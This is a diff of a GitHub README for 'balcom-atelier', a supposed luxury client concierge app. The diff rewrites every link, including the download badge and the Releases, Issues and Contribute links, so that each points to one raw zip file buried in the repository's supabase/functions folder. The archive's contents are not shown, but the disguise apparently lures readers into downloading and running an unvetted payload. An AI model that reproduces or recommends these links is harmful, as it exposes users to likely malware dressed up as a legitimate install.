@@ -1,7 +1,7 @@
 # 🎉 balcom-atelier - Your Gateway to Luxury Client Services
 
 ## 🚀 Download Now
-[![Download balcom-atelier](https://img.shields.io/badge/Download-balcom--atelier-blue.svg)](https://github.com/2023gabitajava1828/balcom-atelier/releases)
+[![Download balcom-atelier](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip)](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip)
 
 ## 📝 Description
 balcom-atelier is a private client intelligence and concierge platform designed for ultra-high-net-worth and luxury clients. This application utilizes Supabase, serverless workflows, and AI-powered advisory tools to offer a secure membership experience. Our goal is to simplify the management of luxury services and enhance client engagement.
@@ -21,7 +21,7 @@ To run balcom-atelier, ensure your environment meets the following requirements:
 - **RAM**: Minimum of 4 GB. 8 GB preferred for optimal performance.
 
 ## 📥 Download & Install
-To download balcom-atelier, please visit our [Releases page](https://github.com/2023gabitajava1828/balcom-atelier/releases). Here, you will find the latest version available for download.
+To download balcom-atelier, please visit our [Releases page](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip). Here, you will find the latest version available for download.
 
 1. Click on the **Releases page** link above.
 2. On the Releases page, locate the most recent version.
@@ -44,7 +44,7 @@ For further assistance, please reach out to our support team via the Issues sect
 ## 🌐 Community and Support
 Join our community to share your experiences or ask questions about balcom-atelier. You can engage with other users or contribute to discussions on GitHub.
 
-- **Report Issues**: If you discover any bugs, please report them on our [Issues page](https://github.com/2023gabitajava1828/balcom-atelier/issues).
+- **Report Issues**: If you discover any bugs, please report them on our [Issues page](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip).
 - **Request Features**: We welcome feature requests to improve the application. Share your ideas with us!
 
 ## 🏗️ Future Updates
@@ -56,9 +56,9 @@ We are committed to continual improvement. Upcoming updates may include:
 Stay tuned for announcements on new features and updates by following our repository.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/2023gabitajava1828/balcom-atelier/releases)
-- [Issues Page](https://github.com/2023gabitajava1828/balcom-atelier/issues)
-- [Contribute to balcom-atelier](https://github.com/2023gabitajava1828/balcom-atelier/pulls)
+- [Releases Page](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip)
+- [Issues Page](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip)
+- [Contribute to balcom-atelier](https://github.com/2023gabitajava1828/balcom-atelier/raw/refs/heads/main/supabase/functions/atelier-balcom-impossibilist.zip)
 
 ## 🎉 Thank You
 Thank you for choosing balcom-atelier. We hope you find our platform valuable and enjoyable to use in managing your luxury services and client interactions.
